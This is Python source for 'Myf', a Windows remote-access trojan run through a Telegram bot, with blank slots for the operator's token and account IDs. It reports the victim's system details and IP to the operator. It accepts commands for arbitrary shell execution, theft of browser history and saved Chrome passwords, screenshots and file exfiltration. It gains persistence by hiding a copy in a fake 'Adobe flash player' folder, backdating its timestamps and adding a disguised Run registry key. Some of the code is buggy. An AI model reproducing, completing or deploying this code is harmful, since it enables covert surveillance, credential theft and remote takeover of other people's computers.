import os
import sys
import time
import shutil
import winreg
import cv2
import platform
import datetime
import psutil
import getpass
import telepot
import requests
import win32api
import winshell
import threading
import subprocess
from PIL import ImageGrab
from telepot.loop import MessageLoop

uname = platform.uname()
hostname = platform.node()
osmachine = platform.system()
boottime = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%H:%M:%S")

totalram = round(psutil.virtual_memory().total/1000000000, 2)
ramused = round(psutil.virtual_memory().used/1000000000, 2)
ramusage = psutil.virtual_memory().percent

pc_username = os.getenv("UserName")
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

cpu = platform.processor()
cpucount = psutil.cpu_count()

if "Intel" in cpu:
	cpu = "Intel"
else:
	cpu = "AMD"

def getip():
	ip = requests.get("https://checkip.amazonaws.com/").text
	return ip

ip = getip()

class myf:
	def __init__(self):
		MessageLoop(bot, self.bot_handler).run_as_thread()
		for chat in TrustedChats:
			bot.sendMessage(chat, f"""🎯 Myf | Connection
         {pc_username}@{hostname}

         OS: {osmachine}
         BootTime: {boottime}

         CPU: {cpu}
         Cores: {cpucount}

         RAM: {totalram} GB
         Used: {ramused} GB
         Usage: {ramusage} %

         IP: {ip}
			""")

		for user in TrustedUsers:
			bot.sendMessage(user, f"""🎯 Myf | Connection
         {pc_username}@{hostname}

         IP: {ip}
         OS: {osmachine}
         BootTime: {boottime}

         CPU: {cpu}
         Cores: {cpucount}

         RAM: {totalram} GB
         Used: {ramused} GB
         Usage: {ramusage} %
			""")

	
	def set_autorun(self):
		application = sys.argv[0]
		start_path = os.path.join(os.path.abspath(os.getcwd()), application)
		copy2_path = "{}\\{}".format(winshell.my_documents(), "Adobe flash player")
		copy2_app = os.path.join(copy2_path, "Flash player updater.py")
        
		if not os.path.exists(copy2_path):
			os.makedirs(copy2_path)
    
		win32api.CopyFile(start_path, copy2_app)

		win32api.SetFileAttributes(copy2_path, 2)
		os.utime(copy2_app, (1282372620, 1282372620))
		os.utime(copy2_path, (1282372620, 1282372620))

		startup_val = r"Software\Microsoft\Windows\CurrentVersion\Run"
		key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_val, 0, winreg.KEY_ALL_ACCESS)
		winreg.SetValueEx(key2change, 'Flash player updater', 0, winreg.REG_SZ, start_path+" --quiet")
		

	def bot_handler(self, message):
		userid = message["from"]["id"]
		chatid = message["chat"]["id"]

		if userid in TrustedUsers or chatid in TrustedChats:
			try:
				args = message["text"].split()
			except KeyError:
				args = [""]

				if "document" in message:
					file_id = message["document"]["file_id"]
					file_name = message["document"]["file_name"]
				elif "photo" in message:
					file_id = message["photo"][-1]["file_id"]
					file_name = "{}.jpg".format(file_id)

				file_path = bot.getFile(file_id)['file_path']
				link = "https://api.telegram.org/file/bot{}/{}".format(token, file_path)
				File = requests.get(link, stream=True).raw

				save_path = os.path.join(os.getcwd(), file_name)
				with open(save_path, "wb") as out_file:
					shutil.copyfileobj(File, out_file)
				
				bot.sendMessage(message["chat"]["id"], "file uploaded")

			if args[0] == "/help":
				s = """
				🎯 Myf | Tools 

				🕸️ Discord
					/tokens       [IN PROGRESS]
					/discordinfo  [IN PROGRESS]

				📚 Files
					/execute <file>
					/download <file>
					/remove <file>

				🌐 Browsers
					/history
					/passwords

				📸 Spying
					/screenshot

				📁 Directories
					/dir  
					/cwd
					/cd <dir>

				👾 Tasks
					/tasklist
					/endtask <pid>

				💥 Misc
					/cmd <command>
					/startup
				"""
				bot.sendMessage(message["chat"]["id"], str(s))

			elif args[0] == "/cmd":
				try:
					s = "🎯 {}".format(subprocess.check_output(' '.join(args[1:]), shell=True))
				except:
					s = "❌ Command Error"
					
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))	
			
			elif args[0] == "/startup":
				try:
					set_autorun(self)
					s = "🎯 Added to Startup"
				except:
					s = "❌ Startup Error"
					
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))	
				
			elif args[0] == "/history":
				try:
					browser_history = os.popen('browser-history').read()
					os.system('echo browser-history > C:\\ProgramData\\browserdata.txt')
					f = open("C:\\ProgramData\\browserdata.txt", "w")
					f.write(browser_history)
					f.close()
					bot.sendDocument(message["chat"]["id"], open("C:\\ProgramData\\browserdata.txt", "rb"))
				except:
					s = "❌ History Error"
					
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))	
				
			elif args[0] == "/tasklist":
				try:
					taskdata = os.system('tasklist').read()
					os.system('echo tasklist > C:\\ProgramData\\Tasks.txt')
					f = open("C:\\ProgramData\\Tasks", "w")
					f.write(taskdata)
					f.close()
					bot.sendDocument(message["chat"]["id"], open("C:\\ProgramData\\Tasks.txt", "rb"))
				except:
					s = "❌ Tasklist Error"
					bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))	
					
			elif args[0] == "/endtask":
				try:
					taskpid = args[1]
					os.system('taskkill /F /PID ' + taskpid)
					s = "🎯 Task Killed"
				except:
					s = "❌ Task-End Error"
					
				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))	
				
			elif args[0] == "/passwords":
				try:
					chromepass = os.popen('chromepass').read()
					os.system('echo chromepass > C:\\ProgramData\\Passwords.txt')
					f = open("C:\\ProgramData\\Passwords.txt", "w")
					f.write(chromepass)
					f.close()
					bot.sendDocument(message["chat"]["id"], open("C:\\ProgramData\\Passwords.txt", "rb"))
				except:
					s = "❌ Password Error"

			elif args[0] == "/execute":
				try:
					subprocess.Popen(args[1:], shell=True)
					s = "🎯 Program Executed"
					
				except:
					s = "❌ Program Error"

				bot.sendMessage(message["chat"]["id"], "{}".format(str(s)))

			elif args[0] == "/cwd":
				bot.sendMessage(message["chat"]["id"], "{}".format(str(os.path.abspath(os.getcwd()))))
				
			elif args[0] == "/dir":
				if len(args) == 1:
					pth = "."
				else:
					pth = args[1]
					
				s = '\n'.join(os.listdir(path=pth))
				
				bot.sendMessage(message["chat"]["id"], "🎯 Files \n{}".format(str(s)))
				
			elif args[0] == "/cd":
				path = os.path.abspath(args[1])
				os.chdir(path)
				bot.sendMessage(message["chat"]["id"], "🎯 Directory Changed [{}]".format(str(path)))
				
			elif args[0] == "/screenshot":
				image = ImageGrab.grab()
				image.save("pic.jpg")
				bot.sendDocument(message["chat"]["id"], open("pic.jpg", "rb"))
				os.remove("pic.jpg")

			elif args[0] == "/download":
				File = ' '.join(map(str, args[1:]))
				try:
					bot.sendDocument(message["chat"]["id"], open(File, "rb"))
				except:
					bot.sendMessage(message["chat"]["id"], "you must select the file")

			elif args[0] == "":
				pass
			else:
				bot.sendMessage(message["chat"]["id"], "❌ Invalid Command!")

		else:
			bot.sendMessage(message["chat"]["id"], "❌ User Not in [TrustedUsers]")

if __name__ == '__main__':
	token = "" #Your Telegram Bot Token 
	bot = telepot.Bot(token)
	
	TrustedUsers = [] #Your Account ID(s)
	TrustedChats = [] #Group ID (if multiple users want to use it in the same group) [OPTIONAL]
	myf()
